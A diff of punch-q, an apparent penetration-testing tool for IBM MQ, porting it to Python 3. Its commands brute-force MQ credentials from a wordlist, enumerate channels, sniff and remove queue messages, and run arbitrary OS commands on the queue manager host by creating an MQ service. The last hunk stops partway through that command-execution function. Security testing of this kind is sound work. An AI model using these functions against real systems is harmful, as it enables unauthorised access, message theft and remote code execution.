@@ -1,20 +1,19 @@
 import hashlib
 import os
-import string
 import time
 import uuid
 
 import click
 import yaml as yamllib
+from slugify import slugify
 
 try:
     import pymqi
 
 except ImportError as e:
-
     pymqi = None
 
-    click.secho('Importing pymqi failed with: {0}!'.format(str(e)), fg='red')
+    click.secho(f'Importing pymqi failed with: {str(e)}!', fg='red')
 
     # If the LD_LIBRARY_PATH wasn't set, try and detect that and suggest a fix.
     if 'cannot open shared object file' in str(e):
@@ -25,7 +24,7 @@ except ImportError as e:
 
 from libpunchq.__init__ import __version__
 from libpunchq.conversion import channel_type_to_name, queue_type_to_name, \
-    queue_usage_to_name
+    queue_usage_to_name, mq_string
 from libpunchq.mqstate import mqstate
 from libpunchq.utils import get_table_handle, \
     is_ip_address, safe_filename, filename_from_attributes
@@ -51,7 +50,7 @@ def cli(config, host, port, qm_name, channel, username, password, dump_config, t
     # set the mq configuration based on the configuration file
     if config is not None:
         with open(config) as f:
-            config_data = yamllib.load(f)
+            config_data = yamllib.load(f, Loader=yamllib.FullLoader)
             mqstate.dictionary_updater(config_data)
 
     # set configuration based on the flags this command got
@@ -61,12 +60,12 @@ def cli(config, host, port, qm_name, channel, username, password, dump_config, t
     if dump_config:
         click.secho('Effective configuration for this run:', dim=True)
         click.secho('-------------------------------------', dim=True)
-        click.secho('Host:                  {0}'.format(mqstate.host), dim=True)
-        click.secho('Port:                  {0}'.format(mqstate.port), dim=True)
-        click.secho('Queue Manager Name:    {0}'.format(mqstate.qm_name), dim=True)
-        click.secho('Channel:               {0}'.format(mqstate.channel), dim=True)
-        click.secho('Username:              {0}'.format(mqstate.username), dim=True)
-        click.secho('Password:              {0}\n'.format(mqstate.password), dim=True)
+        click.secho(f'Host:                  {mqstate.host}', dim=True)
+        click.secho(f'Port:                  {mqstate.port}', dim=True)
+        click.secho(f'Queue Manager Name:    {mqstate.qm_name}', dim=True)
+        click.secho(f'Channel:               {mqstate.channel}', dim=True)
+        click.secho(f'Username:              {mqstate.username}', dim=True)
+        click.secho(f'Password:              {mqstate.password}\n', dim=True)
 
 
 @cli.command()
@@ -75,7 +74,7 @@ def version():
         Prints the current punch-q version
     """
 
-    click.secho('punch-q version {0}'.format(__version__))
+    click.secho(f'punch-q version {__version__}')
 
 
 @cli.command()
@@ -83,13 +82,12 @@ def version():
               help='Destination filename to write the sample configuration file to.')
 def yaml(destination):
     """
-        Generate an example YAML configuration file to use
-        with this tool.
+        Generate an example YAML configuration file
     """
 
     # Don't be a douche and override an existing configuration
     if os.path.exists(destination):
-        click.secho('The configuration file \'{0}\' already exists.'.format(destination), fg='yellow')
+        click.secho(f'The configuration file \'{destination}\' already exists.', fg='yellow')
         if not click.confirm('Override?'):
             click.secho('Not writing a new sample configuration file')
             return
@@ -107,14 +105,14 @@ def yaml(destination):
     click.secho(yamllib.dump(config, default_flow_style=False), bold=True)
 
     try:
-        with open(destination, 'wb') as f:
-            f.write('# A punch-q configuration file\n\n')
+        with open(destination, 'w') as f:
+            f.write('# A punch-q configuration file\n')
             f.write(yamllib.dump(config, default_flow_style=False))
 
-        click.secho('Sample configuration file written to: {0}'.format(destination), fg='green')
+        click.secho(f'Sample configuration file written to: {destination}', fg='green')
 
     except Exception as ye:
-        click.secho('Failed to write sample configuration file with error: {0}'.format(str(ye)), fg='red')
+        click.secho(f'Failed to write sample configuration file with error: {str(ye)}', fg='red')
 
 
 @cli.command()
@@ -133,12 +131,15 @@ def ping():
     click.secho('Queue manager command server is responsive.', fg='green')
 
     # Attempt to determine the MQ command level.
-    mq_params = pcf.MQCMD_INQUIRE_Q_MGR({pymqi.CMQCFC.MQCMD_INQUIRE_SYSTEM: '*'})
+    mq_params = pcf.MQCMD_INQUIRE_Q_MGR({pymqi.CMQCFC.MQCMD_INQUIRE_SYSTEM: '*'.encode()})
 
     # Get the queue manager status
     mq_status = pcf.MQCMD_INQUIRE_Q_MGR_STATUS()[0]
 
-    # A number of these are not in CMQC, so this comment is a reference:
+    # A number of these are not in CMQC.py, so
+    # this comment is a reference from the C headers
+    # resolving some of the constants.
+    #
     # MQCA_INSTALLATION_DESC: 2115
     # MQCA_INSTALLATION_NAME: 2116
     # MQCA_INSTALLATION_PATH: 2117
@@ -148,15 +149,15 @@ def ping():
 
     click.secho('Queue Manager Status:', bold=True)
     click.secho('---------------------', bold=True)
-    click.secho('Command Level:             {0}'.format(mq_params[0][pymqi.CMQC.MQIA_COMMAND_LEVEL]), bold=True)
-    click.secho('Queue Manager Name:        {0}'.format(mq_status.get(pymqi.CMQC.MQCA_Q_MGR_NAME, '(unknown)')),
-                bold=True)
-    click.secho('Installation Name:         {0}'.format(mq_status.get(2116, '(unknown)')), bold=True)
-    click.secho('Installation Path:         {0}'.format(mq_status.get(2117, '(unknown)')), bold=True)
-    click.secho('Installation Description:  {0}'.format(mq_status.get(2115, '(unknown)')), bold=True)
-    click.secho('Log Path:                  {0}'.format(mq_status.get(3074, '(unknown)')), bold=True)
-    click.secho('Queue Manager Start Time:  {0}'.format(' '.join([
-        mq_status.get(3175, '').strip(), mq_status.get(3176, '').strip()])), bold=True)
+    click.secho(f'Command Level:             {mq_params[0][pymqi.CMQC.MQIA_COMMAND_LEVEL]}', bold=True)
+    click.secho('Queue Manager Name:        ' +
+                f'{mq_string(mq_status.get(pymqi.CMQC.MQCA_Q_MGR_NAME, "(unknown)"))}', bold=True)
+    click.secho(f'Installation Name:         {mq_string(mq_status.get(2116, "(unknown)"))}', bold=True)
+    click.secho(f'Installation Path:         {mq_string(mq_status.get(2117, "(unknown)"))}', bold=True)
+    click.secho(f'Installation Description:  {mq_string(mq_status.get(2115, "(unknown)"))}', bold=True)
+    click.secho(f'Log Path:                  {mq_string(mq_status.get(3074, "(unknown)"))}', bold=True)
+    click.secho('Queue Manager Start Time:  ' +
+                f'{mq_string(mq_status.get(3175, ""))} {mq_string(mq_status.get(3176, ""))}', bold=True)
     click.secho('\n')
 
     click.secho('Successfully queried queue manager status.', fg='green')
@@ -181,7 +182,7 @@ def channels(wordlist):
 
         This command attempts to enumerate MQ channels using the provided
         configuration options. A list of default channel names is used
-        if no wordlist is provided. Extra permutations will be generated
+        if no word list is provided. Extra permutations will be generated
         if the target host is not an IP address.
 
         A number of cases exist where a channel does in fact exist
@@ -217,7 +218,7 @@ def channels(wordlist):
         wordlist.append(base_name + '.ADMIN.CHANNEL')
         wordlist.append(base_name + '.DEV.CHANNEL')
 
-        # uniqify the final list
+        # 'uniqify' the final list
         wordlist = list(set(wordlist))
 
     # Loop the wordlist, trying to connect to the target channel.
@@ -227,11 +228,9 @@ def channels(wordlist):
     # from the target queue manager. Luckily, MQ responds with a clear
     # message if the remote channel does not exist.
     for channel in wordlist:
-
         channel = channel.strip()
 
         try:
-
             qmgr = pymqi.connect(mqstate.qm_name, str(channel), mqstate.get_host(),
                                  mqstate.username, mqstate.password)
 
@@ -240,8 +239,7 @@ def channels(wordlist):
 
             # If no exception is thrown, the channel exists *AND* we have access
             # with the supplied credentials (or lack thereof).
-            click.secho('"{0}" exists and was authorised.'.format(channel), fg='green', bold=True)
-
+            click.secho(f'"{channel}" exists and was authorised.', fg='green', bold=True)
             qmgr.disconnect()
 
         except pymqi.MQMIError as ce:
@@ -261,17 +259,17 @@ def channels(wordlist):
 
             # Channel is unavailable
             elif ce.reason == pymqi.CMQC.MQRC_CHANNEL_NOT_AVAILABLE:
-                click.secho('"{0}" might exist, but is not available.'.format(channel), bold=True, fg='yellow')
+                click.secho(f'"{channel}" might exist, but is not available.', bold=True, fg='yellow')
                 continue
 
             # An unauthenticated message means the channel at least exists.
             elif ce.reason == pymqi.CMQC.MQRC_NOT_AUTHORIZED:
-                click.secho('"{0}" might exist, but user was not authorised.'.format(channel), bold=True)
+                click.secho(f'"{channel}" might exist, but user was not authorised.', bold=True)
                 continue
 
             # Maybe this is an SSL error
             elif ce.reason == pymqi.CMQC.MQRC_SSL_INITIALIZATION_ERROR:
-                click.secho('"{0}" might exist, but wants SSL.'.format(channel), bold=True, fg='yellow')
+                click.secho(f'"{channel}" might exist, but wants SSL.', bold=True, fg='yellow')
                 continue
 
             # Some other error condition occurred.
@@ -289,8 +287,7 @@ def users(channel):
         global --channel flag used for configuration.
     """
 
-    click.secho('Brute forcing users on channel: {0}'.format(channel))
-
+    click.secho(f'Brute forcing users on channel: {channel}', bold=True)
     wordlist = os.path.join(os.path.abspath(os.path.dirname(__file__)), 'wordlists/', 'mq_users.txt')
 
     with open(wordlist, 'r') as f:
@@ -300,15 +297,14 @@ def users(channel):
     for user in wordlist:
 
         username, password = user.strip().split(':')
-
-        print(username + ':' + password)
+        click.secho(username + ':' + password, dim=True)
 
         try:
             qmgr = pymqi.connect(mqstate.qm_name, channel, mqstate.get_host(), username, password)
             pcf = pymqi.PCFExecute(qmgr)
             pcf.MQCMD_PING_Q_MGR()
 
-            click.secho('Combination "{0}:{1}" authenticated.'.format(username, password), fg='green', bold=True)
+            click.secho(f'Combination "{username}:{password}" authenticated!', fg='green', bold=True)
 
             qmgr.disconnect()
 
@@ -334,11 +330,11 @@ def name():
             click.secho('No channel provided, defaulting to SYSTEM.DEF.SVRCONN', dim=True)
             mqstate.channel = 'SYSTEM.DEF.SVRCONN'
 
-        qmgr = pymqi.connect(queue_manager='', channel=mqstate.channel, conn_info=mqstate.get_host())
+        qmgr = pymqi.connect(queue_manager='',
+                             channel=mqstate.channel, conn_info=mqstate.get_host())
         qmgr_name = qmgr.inquire(pymqi.CMQC.MQCA_Q_MGR_NAME)
 
-        click.secho('Queue Manager name: {}'.format(qmgr_name.strip()), fg='green')
-
+        click.secho(f'Queue Manager name: {mq_string(qmgr_name)}', fg='green')
         qmgr.disconnect()
 
     except pymqi.MQMIError as ce:
@@ -369,7 +365,7 @@ def queues(prefix, min_depth):
     mqstate.validate(['host', 'port', 'channel'])
 
     args = {
-        pymqi.CMQC.MQCA_Q_NAME: str(prefix),
+        pymqi.CMQC.MQCA_Q_NAME: prefix.encode(),
         pymqi.CMQC.MQIA_Q_TYPE: pymqi.CMQC.MQQT_ALL
     }
 
@@ -379,9 +375,9 @@ def queues(prefix, min_depth):
 
     try:
 
-        click.secho('Showing queues with prefix: \'{0}\'...'.format(prefix), dim=True)
+        click.secho(f'Showing queues with prefix: "{prefix}"...', dim=True)
         if min_depth > 0:
-            click.secho('Limiting queues to those with at least {} message(s)...'.format(min_depth), dim=True)
+            click.secho(f'Limiting queues to those with at least {min_depth} message(s)...', dim=True)
 
         response = pcf.MQCMD_INQUIRE_Q(args)
 
@@ -389,7 +385,7 @@ def queues(prefix, min_depth):
 
         # no queues found
         if sqe.comp == pymqi.CMQC.MQCC_FAILED and sqe.reason == pymqi.CMQC.MQRC_UNKNOWN_OBJECT_NAME:
-            click.secho('No queues matched given prefix of {0}'.format(prefix), fg='red')
+            click.secho(f'No queues matched given prefix of {prefix}', fg='red')
 
         else:
             raise sqe
@@ -409,22 +405,22 @@ def queues(prefix, min_depth):
             # try and resolve the transmission queue for remote queue types
             q_type = queue_type_to_name(queue_info.get(pymqi.CMQC.MQIA_Q_TYPE))
             if q_type == 'Remote':
-                xmit_q = queue_info.get(pymqi.CMQC.MQCA_XMIT_Q_NAME, '').strip()
+                xmit_q = mq_string(queue_info.get(pymqi.CMQC.MQCA_XMIT_Q_NAME, ''))
                 if len(xmit_q) > 0:
-                    q_type = q_type + ' (Transmission Q: {})'.format(xmit_q)
+                    q_type = q_type + f' (Transmission Q: {xmit_q})'
 
             t.append_row([
                 ' '.join([
-                    queue_info.get(pymqi.CMQC.MQCA_CREATION_DATE, '').strip(),
-                    queue_info.get(pymqi.CMQC.MQCA_CREATION_TIME, '').strip()
+                    mq_string(queue_info.get(pymqi.CMQC.MQCA_CREATION_DATE, '')),
+                    mq_string(queue_info.get(pymqi.CMQC.MQCA_CREATION_TIME, ''))
                 ]),
-                queue_info.get(pymqi.CMQC.MQCA_Q_NAME, '').strip(),
+                mq_string(queue_info.get(pymqi.CMQC.MQCA_Q_NAME, '')),
                 q_type,
                 queue_usage_to_name(queue_info.get(pymqi.CMQC.MQIA_USAGE)),
                 queue_info.get(pymqi.CMQC.MQIA_CURRENT_Q_DEPTH, ''),
-                queue_info.get(pymqi.CMQC.MQCA_REMOTE_Q_MGR_NAME, '').strip(),
-                queue_info.get(pymqi.CMQC.MQCA_REMOTE_Q_NAME, '').strip(),
-                queue_info.get(pymqi.CMQC.MQCA_Q_DESC, '').strip(),
+                mq_string(queue_info.get(pymqi.CMQC.MQCA_REMOTE_Q_MGR_NAME, '')),
+                mq_string(queue_info.get(pymqi.CMQC.MQCA_REMOTE_Q_NAME, '')),
+                mq_string(queue_info.get(pymqi.CMQC.MQCA_Q_DESC, '')),
             ])
         click.secho(t.get_string())
 
@@ -441,20 +437,20 @@ def channels(prefix):
 
     mqstate.validate(['host', 'port', 'channel'])
 
-    args = {pymqi.CMQCFC.MQCACH_CHANNEL_NAME: str(prefix)}
+    args = {pymqi.CMQCFC.MQCACH_CHANNEL_NAME: prefix.encode()}
     qmgr = pymqi.connect(mqstate.qm_name, mqstate.channel, mqstate.get_host(),
                          mqstate.username, mqstate.password)
     pcf = pymqi.PCFExecute(qmgr)
 
     try:
 
-        click.secho('Showing channels with prefix: \'{0}\'...\n'.format(prefix), dim=True)
+        click.secho(f'Showing channels with prefix: "{prefix}"...\n', dim=True)
         response = pcf.MQCMD_INQUIRE_CHANNEL(args)
 
     except pymqi.MQMIError as sce:
 
         if sce.comp == pymqi.CMQC.MQCC_FAILED and sce.reason == pymqi.CMQC.MQRC_UNKNOWN_OBJECT_NAME:
-            click.secho('No channels matched prefix [%s]'.format(prefix), fg='red')
+            click.secho(f'No channels matched prefix {prefix}', fg='red')
 
         else:
             raise sce
@@ -467,15 +463,13 @@ def channels(prefix):
 
         for channel_info in response:
             t.append_row([
-                channel_info.get(pymqi.CMQCFC.MQCACH_CHANNEL_NAME, '').strip(),
+                mq_string(channel_info.get(pymqi.CMQCFC.MQCACH_CHANNEL_NAME, '')),
                 channel_type_to_name(channel_info.get(pymqi.CMQCFC.MQIACH_CHANNEL_TYPE)),
-                channel_info.get(pymqi.CMQCFC.MQCACH_MCA_USER_ID, ''),
-                channel_info.get(pymqi.CMQCFC.MQCACH_CONNECTION_NAME, '').strip(),
-                channel_info.get(pymqi.CMQCFC.MQCACH_XMIT_Q_NAME, '').strip(),
-                channel_info.get(pymqi.CMQCFC.MQCACH_DESC, '').strip(),
-                # channel_info.get(pymqi.CMQCFC.MQCACH_PASSWORD, '(unknown)').strip(),
-                channel_info.get(pymqi.CMQCFC.MQCACH_SSL_CIPHER_SPEC, '').strip(),
-                # channel_info.get(pymqi.CMQCFC.MQCACH_SSL_PEER_NAME, '').strip(),
+                mq_string(channel_info.get(pymqi.CMQCFC.MQCACH_MCA_USER_ID, '')),
+                mq_string(channel_info.get(pymqi.CMQCFC.MQCACH_CONNECTION_NAME, '')),
+                mq_string(channel_info.get(pymqi.CMQCFC.MQCACH_XMIT_Q_NAME, '')),
+                mq_string(channel_info.get(pymqi.CMQCFC.MQCACH_DESC, '')),
+                mq_string(channel_info.get(pymqi.CMQCFC.MQCACH_SSL_CIPHER_SPEC, '')),
             ])
         click.secho(t.get_string())
 
@@ -500,7 +494,8 @@ def dump(queue, limit):
         Dump messages from a queue, non-destructively.
     """
 
-    click.secho('Dumping a maximum of {0} messages from {1}...'.format(limit, queue), dim=True)
+    click.secho(f'Dumping a maximum of {limit} messages from {queue}...', dim=True)
+    click.secho('Only printing ASCII characters.', dim=True)
 
     qmgr = pymqi.connect(mqstate.qm_name, mqstate.channel, mqstate.get_host(),
                          mqstate.username, mqstate.password)
@@ -514,9 +509,7 @@ def dump(queue, limit):
     message_count = 0
 
     while message_count < limit:
-
         try:
-
             request_md = pymqi.MD()
             message = queue.get(None, request_md, gmo)
 
@@ -524,21 +517,20 @@ def dump(queue, limit):
             if request_md.Format.strip() not in ['MQSTR', '']:
                 # remove non-printables and update the Format
                 # column with (stripped) so that it is visible
-                message = filter(lambda x: x in string.printable if x not in ['\n', '\t', '\r', '\r\n'] else '',
-                                 message)
-                request_md.Format = request_md.Format.strip() + ' (stripped)'
+                message = message.decode('ascii', errors='ignore')
+                request_md.Format = mq_string(request_md.Format) + ' (stripped)'
 
-            table = get_table_handle(['Date', 'Time', 'MsgID', 'MsgType', 'Expiry', 'User', 'Format', 'App Name'],
-                                     markdown=False)
+            table = get_table_handle(['Date', 'Time', 'MsgID', 'MsgType', 'Expiry',
+                                      'User', 'Format', 'App Name'], markdown=False)
             table.append_row([
-                request_md.PutDate,
-                request_md.PutTime,
-                filter(lambda x: x in string.printable, request_md.MsgId),  # f* up non-printables.
+                mq_string(request_md.PutDate),
+                mq_string(request_md.PutTime),
+                request_md.MsgId.decode('ascii', errors='ignore'),
                 request_md.MsgType,
                 request_md.Expiry,
-                request_md.UserIdentifier.strip(),
-                request_md.Format.strip(),
-                request_md.PutApplName.strip(),
+                mq_string(request_md.UserIdentifier),
+                mq_string(request_md.Format),
+                mq_string(request_md.PutApplName),
             ])
 
             # Print a 'header' for the message
@@ -546,11 +538,10 @@ def dump(queue, limit):
 
             # Print the message itself
             click.secho('\n' + '*' * 40 + ' BEGIN MESSAGE DATA ' + '*' * 40, dim=True)
-            click.secho(message.strip())
+            click.secho(message, bold=True)
             click.secho('*' * 41 + ' END MESSAGE DATA ' + '*' * 41 + '\n', dim=True)
 
         except pymqi.MQMIError as dme:
-
             if dme.comp == pymqi.CMQC.MQCC_FAILED and dme.reason == pymqi.CMQC.MQRC_NO_MSG_AVAILABLE:
                 click.secho('Dump complete. No more messages on the queue.', fg='yellow')
 
@@ -568,7 +559,7 @@ def dump(queue, limit):
         message_count += 1
 
     click.secho('')
-    click.secho('\nGot {0} message(s) in total.'.format(message_count), dim=True)
+    click.secho(f'\nGot {message_count} message(s) in total.', dim=True)
 
     queue.close()
     qmgr.disconnect()
@@ -596,20 +587,20 @@ def sniff(queue, store, directory):
 
     # check if a directory was set but store was not
     if directory and not store:
-        click.secho('A directory was set to store messages but --store flag was not provided, ignoring...', dim=True,
-                    fg='yellow')
+        click.secho('A directory was set to store messages but --store flag was not provided, ignoring...',
+                    bold=True, fg='yellow')
 
     # Prepare the destination directory if messages should also be saved
     if store:
         # Automatically generate a directory to save messages to
         if not directory:
             directory = safe_filename(mqstate.host + '_' + safe_filename(queue))
-            click.secho('Messages will be saved to directory \'{0}\''.format(directory), dim=True, fg='green')
+            click.secho(f'Messages will be saved to directory \'{directory}\'', dim=True, fg='green')
 
         # check that the directory is ready for use
         absolute_path = os.path.abspath(directory)
         if not os.path.exists(absolute_path):
-            click.secho('Creating {0} to save messages in...'.format(absolute_path), dim=True)
+            click.secho(f'Creating {absolute_path} to save messages in...', dim=True)
             os.makedirs(absolute_path, mode=0o755)
 
     qmgr = pymqi.connect(mqstate.qm_name, mqstate.channel, mqstate.get_host(),
@@ -623,7 +614,6 @@ def sniff(queue, store, directory):
     gmo.WaitInterval = 2 * 1000  # 5 seconds
 
     queue = pymqi.Queue(qmgr, str(queue), pymqi.CMQC.MQOO_BROWSE)
-
     request_md = pymqi.MD()
 
     # simple counter for statistics
@@ -631,9 +621,7 @@ def sniff(queue, store, directory):
     click.secho('Waiting for messages to arrive...', dim=True)
 
     while True:
-
         try:
-
             # grab the message
             message = queue.get(None, request_md, gmo)
             message_count += 1
@@ -642,42 +630,45 @@ def sniff(queue, store, directory):
             # messages could be reformatted to be printed to screen.
             if store:
                 file_name = filename_from_attributes(
-                    request_md.PutDate,
-                    request_md.PutTime,
-                    request_md.MsgType,
+                    mq_string(request_md.PutDate),
+                    mq_string(request_md.PutTime),
                     '.' + hashlib.sha1(request_md.MsgId).hexdigest() + '.',
+                    request_md.MsgType,
                     request_md.Expiry,
-                    request_md.UserIdentifier.strip(),
-                    request_md.Format.strip(),
-                    request_md.PutApplName.strip())
+                    mq_string(request_md.UserIdentifier),
+                    mq_string(request_md.Format),
+                    mq_string(request_md.PutApplName))
+
+                # try get a safe filename from all of that
+                file_name = slugify(file_name)
 
                 with open(os.path.join(absolute_path, file_name), 'wb') as f:
                     f.write(message)
 
-                click.secho('{0}: Wrote message to {1}'.format(message_count, file_name), bold=True, fg='green')
+                click.secho(f'{message_count}: Wrote message to {file_name}', bold=True, fg='green')
 
             # check if we have a MQSTR message. If we don't, try and filter
             # non-printables.
             if request_md.Format.strip() not in ['MQSTR', '']:
                 # remove non-printables and update the Format
                 # column with (stripped) so that it is visible
-                message = filter(lambda x: x in string.printable if x not in ['\n', '\t', '\r', '\r\n'] else '',
-                                 message)
-                request_md.Format = request_md.Format.strip() + ' (stripped)'
+                message = message.decode('ascii', errors='ignore')
+                request_md.Format = mq_string(request_md.Format) + ' (stripped)'
 
-            click.secho('Message #{0}'.format(message_count), bold=True)
+            click.secho(f'Message #{message_count}', fg='green')
 
-            table = get_table_handle(['Date', 'Time', 'MsgID', 'MsgType', 'Expiry', 'User', 'Format', 'App Name'],
-                                     markdown=False)
+            table = get_table_handle([
+                'Date', 'Time', 'MsgID', 'MsgType', 'Expiry', 'User', 'Format', 'App Name'], markdown=False)
+
             table.append_row([
-                request_md.PutDate,
-                request_md.PutTime,
-                filter(lambda x: x in string.printable, request_md.MsgId),  # f* non-printables.
+                mq_string(request_md.PutDate),
+                mq_string(request_md.PutTime),
+                request_md.MsgId.decode('ascii', errors='ignore'),
                 request_md.MsgType,
                 request_md.Expiry,
-                request_md.UserIdentifier.strip(),
-                request_md.Format.strip(),
-                request_md.PutApplName.strip(),
+                mq_string(request_md.UserIdentifier),
+                mq_string(request_md.Format),
+                mq_string(request_md.PutApplName),
             ])
 
             # Print a 'header' for the message
@@ -685,13 +676,14 @@ def sniff(queue, store, directory):
 
             # Print the message itself
             click.secho('' + '*' * 40 + ' BEGIN MESSAGE DATA ' + '*' * 40, dim=True)
-            click.secho(message.strip())
+            click.secho(message, bold=True)
             click.secho('*' * 41 + ' END MESSAGE DATA ' + '*' * 41 + '\n', dim=True)
 
-            # reset the descriptor so we can reuse it.
+            # reset the request descriptor so we can reuse it for the next message.
             request_md.MsgId = pymqi.CMQC.MQMI_NONE
             request_md.CorrelId = pymqi.CMQC.MQCI_NONE
             request_md.GroupId = pymqi.CMQC.MQGI_NONE
+            request_md.Format = pymqi.CMQC.MQGI_NONE
 
         except pymqi.MQMIError as dme:
 
@@ -701,7 +693,7 @@ def sniff(queue, store, directory):
 
             # if we are not allowed to GET on this queue, mention that and quit
             if dme.comp == pymqi.CMQ.MQCC_FAILED and dme.reason == pymqi.CMQC.MQRC_GET_INHIBITED:
-                click.secho('GET not allowed on queue with current access.', fg='red')
+                click.secho('GET not allowed on queue with current credentials.', fg='red')
 
                 break
 
@@ -713,7 +705,7 @@ def sniff(queue, store, directory):
             click.secho('Stopping...', fg='yellow')
             break
 
-    click.secho('\nSniffed {0} message(s) in total.'.format(message_count), dim=True)
+    click.secho(f'\nSniffed {message_count} message(s) in total.', dim=True)
 
     queue.close()
     qmgr.disconnect()
@@ -736,15 +728,15 @@ def save(queue, limit, directory):
     # Automatically generate a directory to save messages to
     if not directory:
         directory = safe_filename(mqstate.host + '_' + safe_filename(queue))
-        click.secho('Saving messages to \'{0}\'...'.format(directory), dim=True, fg='green')
+        click.secho(f'Saving messages to \'{directory}\'...', dim=True, fg='green')
 
     # check that the directory is ready for use
     absolute_path = os.path.abspath(directory)
     if not os.path.exists(absolute_path):
-        click.secho('Creating {0} to save messages in...'.format(absolute_path), dim=True)
+        click.secho(f'Creating {absolute_path} to save messages in...', dim=True)
         os.makedirs(absolute_path, mode=0o755)
 
-    click.secho('Saving a maximum of {0} messages from {1}...'.format(limit, queue), dim=True)
+    click.secho(f'Saving a maximum of {limit} messages from {queue}...', dim=True)
 
     qmgr = pymqi.connect(mqstate.qm_name, mqstate.channel, mqstate.get_host(),
                          mqstate.username, mqstate.password)
@@ -764,22 +756,24 @@ def save(queue, limit, directory):
             message = queue.get(None, request_md, gmo)
 
             file_name = filename_from_attributes(
-                request_md.PutDate,
-                request_md.PutTime,
-                request_md.MsgType,
+                mq_string(request_md.PutDate),
+                mq_string(request_md.PutTime),
                 '.' + hashlib.sha1(request_md.MsgId).hexdigest() + '.',
+                request_md.MsgType,
                 request_md.Expiry,
-                request_md.UserIdentifier.strip(),
-                request_md.Format.strip(),
-                request_md.PutApplName.strip())
+                mq_string(request_md.UserIdentifier),
+                mq_string(request_md.Format),
+                mq_string(request_md.PutApplName))
+
+            # try get a safe filename from all of that
+            file_name = slugify(file_name)
 
             with open(os.path.join(absolute_path, file_name), 'wb') as f:
                 f.write(message)
 
-            click.secho('{0}: Wrote message to {1}'.format(message_count, file_name), bold=True, fg='green')
+            click.secho(f'{message_count}: Wrote message to {file_name}', bold=True, fg='green')
 
         except pymqi.MQMIError as dme:
-
             if dme.comp == pymqi.CMQC.MQCC_FAILED and dme.reason == pymqi.CMQC.MQRC_NO_MSG_AVAILABLE:
                 click.secho('Dump complete. No more messages on the queue.', fg='yellow')
 
@@ -796,7 +790,7 @@ def save(queue, limit, directory):
 
         message_count += 1
 
-    click.secho('Saved {0} message(s) in total.'.format(message_count), bold=True)
+    click.secho(f'Saved {message_count} message(s) in total.', bold=True)
 
     queue.close()
     qmgr.disconnect()
@@ -812,8 +806,9 @@ def pop(queue, save_to, skip_confirmation):
     """
 
     if not skip_confirmation:
-        if not click.confirm('Are you sure you want to pop a message off the queue? This action will '
-                             'REMOVE the message from the selected queue!'):
+        click.secho('WARNING: This action will REMOVE the message from the selected queue!\n' +
+                    'Consider the --save-to flag to save the message you are about to pop.', fg='yellow')
+        if not click.confirm('Are you sure?'):
             click.secho('Did not receive confirmation, bailing...')
             return
 
@@ -837,11 +832,12 @@ def pop(queue, save_to, skip_confirmation):
 
     t = get_table_handle(['Date', 'Time', 'User', 'Format', 'App Name', 'Data'], markdown=False)
     t.append_row([
-        request_md.PutDate, request_md.PutTime,
-        request_md.UserIdentifier.strip(),
-        request_md.Format.strip(),
-        request_md.PutApplName.strip(),
-        message
+        mq_string(request_md.PutDate),
+        mq_string(request_md.PutTime),
+        mq_string(request_md.UserIdentifier),
+        mq_string(request_md.Format),
+        mq_string(request_md.PutApplName),
+        mq_string(message),
     ])
 
     click.secho('')
@@ -850,7 +846,7 @@ def pop(queue, save_to, skip_confirmation):
     # save to file if we got a file argument
     if save_to:
         save_to.write(message)
-        click.secho('\nSaved message data to file: {0}'.format(save_to.name), fg='green')
+        click.secho(f'\nSaved message data to file: {save_to.name}', fg='green')
 
     queue.close()
     qmgr.disconnect()
@@ -876,10 +872,10 @@ def push(queue, source_file, source_string):
     if source_file:
         message = source_file.read()
     else:
-        message = source_string
+        message = source_string.encode()
 
-    click.secho('Pushing message onto queue: {0}'.format(queue), dim=True)
-    click.secho('Message (truncated): {0}'.format(message[:150]), dim=True)
+    click.secho(f'Pushing message onto queue: {queue}', dim=True)
+    click.secho(f'Message (truncated): {message[:150]}', dim=True)
 
     qmgr = pymqi.connect(mqstate.qm_name, mqstate.channel, mqstate.get_host(),
                          mqstate.username, mqstate.password)
@@ -897,8 +893,9 @@ def push(queue, source_file, source_string):
 
     except pymqi.MQMIError as dme:
 
-        if dme.comp == pymqi.CMQC.MQCC_FAILED and dme.reason == pymqi.CMQC.MQRC_NO_MSG_AVAILABLE:
-            click.secho('No messages to pop from the queue.', fg='yellow')
+        # if we are not allowed to GET on this queue, mention that and quit
+        if dme.comp == pymqi.CMQ.MQCC_FAILED and dme.reason == pymqi.CMQC.MQRC_PUT_INHIBITED:
+            click.secho('PUT not allowed on queue with current credentials.', fg='red')
             return
 
         else:
@@ -941,7 +938,7 @@ def execute(cmd, args, service_name, wait, ignore_path):
         service_name = uuid.uuid4()
 
     # Cleanup the service name to remove spaces and dashes and limit to 16 chars
-    service_name = str(service_name).replace('-', '').replace(' ', '')[0:16]
+    service_name = str(service_name).replace('-', '').replace(' ', '')[0:16].encode()
 
     # Check if a full path was provided for the command to run.
     #   Seems like the ENV for MQ does not have a PATH set
@@ -952,9 +949,9 @@ def execute(cmd, args, service_name, wait, ignore_path):
             return
 
     # information
-    click.secho('Cmd: {0}'.format(cmd), bold=True)
-    click.secho('Arg: {0}'.format(args), bold=True)
-    click.secho('Service Name: {0}\n'.format(service_name))
+    click.secho(f'Command: {cmd}', dim=True)
+    click.secho(f'Arguments: {args}', dim=True)
+    click.secho(f'Service Name: {service_name.decode()}\n', dim=True)
 
     qmgr = pymqi.connect(mqstate.qm_name, mqstate.channel, mqstate.get_host(),
                          mqstate.username, mqstate.password)
@@ -965,25 +962,39 @@ def execute(cmd, args, service_name, wait, ignore_path):
         pymqi.CMQC.MQCA_SERVICE_NAME: service_name,
         pymqi.CMQC.MQIA_SERVICE_CONTROL: pymqi.CMQC.MQSVC_CONTROL_MANUAL,
         pymqi.CMQC.MQIA_SERVICE_TYPE: pymqi.CMQC.MQSVC_TYPE_COMMAND,
-        pymqi.CMQC.MQCA_SERVICE_START_COMMAND: str(cmd),
-        pymqi.CMQC.MQCA_SERVICE_START_ARGS: str(args)
+        pymqi.CMQC.MQCA_SERVICE_START_COMMAND: cmd.encode(),
+        pymqi.CMQC.MQCA_SERVICE_START_ARGS: args.encode(),
     }
     pcf = pymqi.PCFExecute(qmgr)
     pcf.MQCMD_CREATE_SERVICE(args)
 
     # start the service
     click.secho('Starting service...', fg='green')
-    args = {pymqi.CMQC.MQCA_SERVICE_NAME: service_name}
+    args = {
+        pymqi.CMQC.MQCA_SERVICE_NAME: service_name
+    }
 
-    pcf = pymqi.PCFExecute(qmgr)
-    pcf.MQCMD_START_SERVICE(args)
+    try:
 
-    click.secho('Giving the service {0} second(s) to live...'.format(wait), dim=True)
